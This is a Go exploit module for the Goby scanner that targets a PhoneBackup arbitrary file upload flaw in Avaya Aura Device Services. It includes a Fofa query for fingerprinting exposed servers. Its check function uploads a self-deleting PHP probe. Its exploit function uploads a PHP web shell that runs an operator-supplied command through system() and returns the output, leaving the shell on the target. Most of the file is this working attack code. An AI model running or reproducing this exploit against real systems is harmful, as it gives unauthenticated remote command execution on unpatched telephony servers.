package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Avaya Aura Device Services PhoneBackup File Upload Vulnerability",
    "Description": "<p>Avaya Aura Device Services is an application software of Avaya Corporation in the United States. Provides a function to manage Avaya endpoints.</p><p>Avaya Aura Device Services versions 7.0 to 8.1.4.0 have security vulnerabilities. Attackers can bypass authentication and upload arbitrary files to obtain server permissions.</p>",
    "Product": "AVAYA-Aura-Utility-Server",
    "Homepage": "https://www.avaya.com/en/",
    "DisclosureDate": "2023-02-01",
    "Author": "corp0ra1",
    "FofaQuery": "((body=\"vmsTitle\\\">Avaya Aura&#8482;&nbsp;Utility Server\" || body=\"/webhelp/Base/Utility_toc.htm\" || (body=\"Avaya Aura&reg;&nbsp;Utility Services\" && body=\"Avaya Inc. All Rights Reserved\")) && body!=\"Server: couchdb\")",
    "GobyQuery": "((body=\"vmsTitle\\\">Avaya Aura&#8482;&nbsp;Utility Server\" || body=\"/webhelp/Base/Utility_toc.htm\" || (body=\"Avaya Aura&reg;&nbsp;Utility Services\" && body=\"Avaya Inc. All Rights Reserved\")) && body!=\"Server: couchdb\")",
    "Level": "2",
    "Impact": "<p>Avaya Aura Device Services versions 7.0 to 8.1.4.0 have security vulnerabilities. Attackers can bypass authentication and upload arbitrary files to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://support.avaya.com/.\">https://support.avaya.com/.</a></p>",
    "References": [
        "https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Avaya Aura Device Services r软件 PhoneBackup 任意文件上传漏洞",
            "Product": "AVAYA-Aura-Utility-Server",
            "Description": "<p>Avaya Aura Device Services是美国Avaya公司的一个应用软件。提供一个管理 Avaya 端点功能。<br></p><p>Avaya Aura Device Services 7.0至8.1.4.0版本存在安全漏洞，攻击者可绕过验证上传任意文件获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://support.avaya.com/\">https://support.avaya.com/</a>。<br></p>",
            "Impact": "<p>Avaya Aura Device Services 7.0至8.1.4.0版本存在安全漏洞，攻击者可绕过验证上传任意文件获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Avaya Aura Device Services PhoneBackup File Upload Vulnerability",
            "Product": "AVAYA-Aura-Utility-Server",
            "Description": "<p>Avaya Aura Device Services is an application software of Avaya Corporation in the United States. Provides a function to manage Avaya endpoints.<br></p><p>Avaya Aura Device Services versions 7.0 to 8.1.4.0 have security vulnerabilities. Attackers can bypass authentication and upload arbitrary files to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://support.avaya.com/.\">https://support.avaya.com/.</a><br></p>",
            "Impact": "<p>Avaya Aura Device Services versions 7.0 to 8.1.4.0 have security vulnerabilities. Attackers can bypass authentication and upload arbitrary files to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randFile := goutils.RandomHexString(6)

			uri := fmt.Sprintf("/PhoneBackup/%s.php", randFile)
			cfg := httpclient.NewRequestConfig("PUT", uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "AVAYA")
			cfg.Data = "<?php echo md5(233);unlink(__FILE__);?>"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 201 {

				uri2 := fmt.Sprintf("/PhoneBackup/%s.php", randFile)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("User-Agent", "AVAYA")
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			randFile := goutils.RandomHexString(6)

			uri := fmt.Sprintf("/PhoneBackup/%s.php", randFile)
			cfg := httpclient.NewRequestConfig("PUT", uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "AVAYA")
			cfg.Data = fmt.Sprintf("<?php system('%s');", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 201 {
				uri2 := fmt.Sprintf("/PhoneBackup/%s.php", randFile)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("User-Agent", "AVAYA")
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}